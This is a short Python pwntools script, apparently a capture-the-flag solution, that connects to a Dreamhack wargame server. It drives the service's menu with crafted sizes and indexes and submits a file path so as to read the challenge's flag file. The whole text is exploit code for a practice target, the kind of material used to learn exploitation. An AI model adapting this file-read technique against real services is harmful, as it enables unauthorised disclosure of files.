from pwn import *

r=remote("host2.dreamhack.games",21948)
print("remote success")

payload="/home/pwnlibrary/flag.txt"

r.recvuntil(":")
r.sendline('1')
r.recvuntil(":")
r.sendline('1')
r.recvuntil(":")
r.sendline('3')
r.recvuntil(":")
r.sendline('275')
r.recvuntil(":")
r.sendline(payload)
r.recvuntil(":")
r.sendline('265')
r.recvuntil(":")
r.sendline('2')
r.recvuntil(":")
r.recvuntil(":")
r.sendline('0')
print(r.recvuntil(":"))


